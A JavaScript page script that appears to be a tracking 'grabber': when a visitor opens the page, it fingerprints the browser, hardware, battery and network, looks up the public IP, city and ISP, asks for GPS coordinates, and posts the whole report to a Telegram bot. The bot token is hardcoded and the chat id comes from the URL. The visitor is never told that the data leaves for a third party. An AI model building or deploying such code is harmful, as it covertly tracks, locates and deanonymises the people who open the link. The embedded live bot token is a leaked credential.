// submit.js (updated: improved adblock detection + explicit GPS permission & reporting)
//
// Note: keeps using client-side Telegram token (same as before).
// Make sure to serve page over HTTPS for geolocation to work for remote visitors.

async function collectAndSend(chatId) {
  if (!chatId) {
    console.warn('No chat id provided in URL.');
    return;
  }

  const safe = (fn, fallback = 'Unknown') => {
    try { const v = fn(); return (v === undefined || v === null) ? fallback : v; } catch { return fallback; }
  };

  // Basic / locale / browser
  const ua = navigator.userAgent || 'Unknown';
  const browser = (() => {
    const u = ua.toLowerCase();
    if (u.includes('edg/')) return 'Edge';
    if (u.includes('opr/') || u.includes('opera')) return 'Opera';
    if (u.includes('chrome') && !u.includes('chromium') && !u.includes('edg/')) return 'Chrome';
    if (u.includes('firefox')) return 'Firefox';
    if (u.includes('safari') && !u.includes('chrome')) return 'Safari';
    return ua;
  })();

  const platform = safe(() => navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform), 'Unknown');
  const language = safe(() => navigator.language || (navigator.languages && navigator.languages[0]), 'Unknown');
  const timezone = safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone, 'Unknown');

  // Hardware
  const cpuCores = safe(() => navigator.hardwareConcurrency, 'Unknown');
  const ram = safe(() => (navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'));

  // Screen
  const resolution = safe(() => `${window.screen.width}x${window.screen.height}`, 'Unknown');
  const colorDepth = safe(() => `${window.screen.colorDepth}-bit`, 'Unknown');

  // WebGL info
  let webglVendor = 'Unknown', webglRenderer = 'Unknown';
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbg) {
        webglVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || 'Unknown';
        webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || 'Unknown';
      } else {
        webglRenderer = gl.getParameter(gl.RENDERER) || 'Unknown';
      }
    }
  } catch (e) {
    // ignore
  }

  // Battery
  let batteryLevel = 'Unknown', batteryCharging = 'Unknown';
  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      batteryLevel = (typeof b.level === 'number') ? Math.round(b.level * 100) + '%' : 'Unknown';
      batteryCharging = (typeof b.charging === 'boolean') ? (b.charging ? 'Yes' : 'No') : 'Unknown';
    }
  } catch (e) { /* ignore */ }

  // Network info (navigator.connection)
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
  const netType = connection ? (connection.effectiveType || 'Unknown') : 'Unknown';
  const downlink = connection ? (connection.downlink ? connection.downlink + ' Mbps' : 'Unknown') : 'Unknown';
  const rtt = connection ? (connection.rtt ? Math.round(connection.rtt) + ' ms' : 'Unknown') : 'Unknown';
  const saveData = connection ? (connection.saveData ? 'Enabled' : 'Disabled') : 'Unknown';

  // Adblock detection (improved): 1) DOM bait element, 2) try fetching a commonly-blocked ad URL
  async function detectAdblock() {
    // 1) DOM bait
    try {
      const bait = document.createElement('div');
      bait.className = 'adsbox ad-banner adsbygoogle adunit';
      bait.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;top:-9999px';
      document.body.appendChild(bait);
      await new Promise(r => setTimeout(r, 60));
      const isHidden = (bait.offsetParent === null || bait.offsetHeight === 0 || bait.clientHeight === 0 || getComputedStyle(bait).display === 'none');
      bait.remove();
      if (isHidden) return 'Positive';
    } catch (e) {
      // continue to second test
    }

    // 2) Fetch a typically-blocked ad script URL (best-effort). Many adblockers block requests to these hosts.
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 2500); // short timeout
      // Using "pagead2.googlesyndication.com" as a commonly blocked domain
      const res = await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'GET', mode: 'no-cors', signal: controller.signal });
      clearTimeout(timeout);
      // If fetch didn't throw, adblock likely didn't block network (note: mode:no-cors hides status),
      // but some blockers still cancel. We'll treat success as negative.
      return 'Negative';
    } catch (err) {
      // network error/aborted -> likely blocked
      return 'Positive';
    }
  }

  // Geolocation: explicit permission flow. We try permission API first (if available) to avoid double prompt.
  async function getGeolocation() {
    let status = 'Denied';
    let latitude = 'Denied';
    let longitude = 'Denied';

    // Helper wrapper to call getCurrentPosition with timeout
    const getPosWithTimeout = (timeoutMs = 8000) => new Promise((resolve, reject) => {
      let done = false;
      const onSuccess = p => { if (!done) { done = true; resolve(p); } };
      const onErr = e => { if (!done) { done = true; reject(e); } };
      navigator.geolocation.getCurrentPosition(onSuccess, onErr, { enableHighAccuracy: false, maximumAge: 60000, timeout: timeoutMs });
      setTimeout(() => { if (!done) { done = true; reject(new Error('timeout')); } }, timeoutMs + 200);
    });

    try {
      if (navigator.permissions && navigator.permissions.query) {
        try {
          const perm = await navigator.permissions.query({ name: 'geolocation' });
          if (perm.state === 'granted') {
            // get position silently
            try {
              const p = await getPosWithTimeout(6000);
              status = 'Allowed';
              latitude = p.coords.latitude;
              longitude = p.coords.longitude;
            } catch (e) {
              status = 'Unavailable';
            }
          } else if (perm.state === 'prompt') {
            // prompt the user
            try {
              const p = await getPosWithTimeout(10000);
              status = 'Allowed';
              latitude = p.coords.latitude;
              longitude = p.coords.longitude;
            } catch (err) {
              // user denied or timed out
              status = (err && err.code === err.PERMISSION_DENIED) ? 'Denied' : 'Unavailable';
            }
          } else if (perm.state === 'denied') {
            status = 'Denied';
          } else {
            // unknown -> try to request directly
            try {
              const p = await getPosWithTimeout(10000);
              status = 'Allowed';
              latitude = p.coords.latitude;
              longitude = p.coords.longitude;
            } catch (err) {
              status = (err && err.code === err.PERMISSION_DENIED) ? 'Denied' : 'Unavailable';
            }
          }
        } catch (e) {
          // permissions.query itself may fail on some browsers, fall back to direct prompt
          try {
            const p = await getPosWithTimeout(10000);
            status = 'Allowed';
            latitude = p.coords.latitude;
            longitude = p.coords.longitude;
          } catch (err) {
            status = (err && err.code === err.PERMISSION_DENIED) ? 'Denied' : 'Unavailable';
          }
        }
      } else {
        // No permissions API — directly request position (this will prompt)
        try {
          const p = await getPosWithTimeout(10000);
          status = 'Allowed';
          latitude = p.coords.latitude;
          longitude = p.coords.longitude;
        } catch (err) {
          status = (err && err.code === err.PERMISSION_DENIED) ? 'Denied' : 'Unavailable';
        }
      }
    } catch (err) {
      status = 'Unavailable';
    }

    return { status, latitude, longitude };
  }

  // Run adblock detection and geolocation in parallel (adblock first may be quick)
  const [adblockResult, geoResult] = await Promise.all([ detectAdblock(), getGeolocation() ]);

  // IP & ISP & City/Region/Country via external API (best-effort)
  let ip = 'Unknown', city = 'Unknown', region = 'Unknown', country = 'Unknown', org = 'Unknown';
  try {
    const res = await fetch('https://ipapi.co/json/');
    if (res.ok) {
      const d = await res.json();
      ip = d.ip || ip;
      city = d.city || city;
      region = d.region || region;
      country = d.country_name || country;
      org = d.org || org;
    } else {
      // fallback try ipify for IP-only
      const r2 = await fetch('https://api.ipify.org?format=json');
      if (r2.ok) {
        const dd = await r2.json();
        ip = dd.ip || ip;
      }
    }
  } catch (e) {
    try {
      const r2 = await fetch('https://api.ipify.org?format=json');
      if (r2.ok) { const dd = await r2.json(); ip = dd.ip || ip; }
    } catch (e2) { /* ignore */ }
  }

  // Build message with GPS results included
  const message =
`🔰 Device Information Report 🔰

🌐 Basic Info:
- Browser: ${browser}
- Platform: ${platform}
- Language: ${language}
- Timezone: ${timezone}

💻 Hardware:
- CPU: ${cpuCores} cores
- RAM: ${ram}
- Screen: ${resolution}, ${colorDepth}
- WebGL: ${webglRenderer} (${webglVendor})

📶 Network:
- Type: ${netType}
- Speed: ${downlink}
- Latency: ${rtt}
- Data Saver: ${saveData}
- ISP: ${org || 'Unknown'}

📍 IP Info:
- IP: ${ip}
- City: ${city}
- Region: ${region}
- Country: ${country}

📌 GPS:
- Status: ${geoResult.status}
- Latitude: ${geoResult.latitude}
- Longitude: ${geoResult.longitude}
*Note: IP-based location may not be accurate.*

🛡️ Adblocker: ${adblockResult}

🔋 Battery:
- Level: ${batteryLevel}
- Charging: ${batteryCharging}
`;

  // Send to Telegram
  const token = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ"; // keep or replace
  const tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;

  try {
    await fetch(tgUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message })
    });
  } catch (err) {
    console.error('Telegram send error', err);
  }
}